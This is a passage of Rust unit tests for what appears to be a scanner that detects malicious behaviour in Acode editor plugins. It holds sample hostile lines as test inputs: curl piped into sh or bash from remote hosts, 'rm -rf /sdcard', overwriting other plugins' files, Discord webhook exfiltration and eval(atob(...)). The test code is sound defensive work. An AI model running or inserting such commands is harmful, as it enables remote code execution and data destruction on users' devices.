            "fsOperation(Url.join(PLUGIN_DIR, 'victim', 'main.js')).writeFile(code)",
            "tampering.plugin_files"
        ));
        assert!(has(
            "const f = acode.fsOperation(DATA_STORAGE + 'plugins/victim/main.js'); f.writeFile(code)",
            "tampering.plugin_files"
        ));
        assert!(!has(
            "fsOperation(PLUGIN_DIR + '/x').readFile()",
            "tampering.plugin_files"
        ));
        assert!(!has(
            "fsOperation(Url.join(PLUGIN_DIR, 'com.example.test', 'bin')).createDirectory('lsp')",
            "tampering.plugin_files"
        ));
    }

    #[test]
    fn checks_shell_commands() {
        assert!(has(
            "Executor.execute('curl -s https://x.io/a.sh | sh')",
            "shell.dangerous_command"
        ));
        assert!(has(
            "Executor.execute(`curl ${host}/payload | bash`)",
            "shell.dangerous_command"
        ));
        assert!(has(
            "Executor.spawnStream(['sh','-c','rm -rf /sdcard'], cb)",
            "shell.dangerous_command"
        ));
        assert!(!has(
            "Executor.execute('apk add nodejs')",
            "shell.dangerous_command"
        ));
        assert!(has(
            "Executor.loadLibrary('/data/x.so')",
            "shell.load_library"
        ));
    }

    #[test]
    fn records_urls_and_flags_webhooks_in_strings() {
        let mut ctx = RuleContext::new(
            "main.js",
            "const u = `https://discord.com/api/webhooks/${id}`; fetch(u)",
            None,
        );
        analyze(&mut ctx);
        assert!(
            ctx.facts
                .urls
                .iter()
                .any(|url| url.contains("discord.com/api/webhooks"))
        );
    }

    #[test]
    fn extracts_inline_html_scripts() {
        let html = "<html>\n<script src=\"https://cdn.x/y.js\"></script>\n<script>eval(atob(p))</script></html>";
        let (js, remote) = html_scripts(html);
        assert_eq!(js.len(), html.len());
        assert_eq!(remote, vec!["https://cdn.x/y.js".to_string()]);
        let mut ctx = RuleContext::new("index.html", &js, None);
        analyze(&mut ctx);
        assert!(
            ctx.findings
                .iter()
                .any(|finding| finding.id == "dynamic.decoded_exec")
        );
    }
}
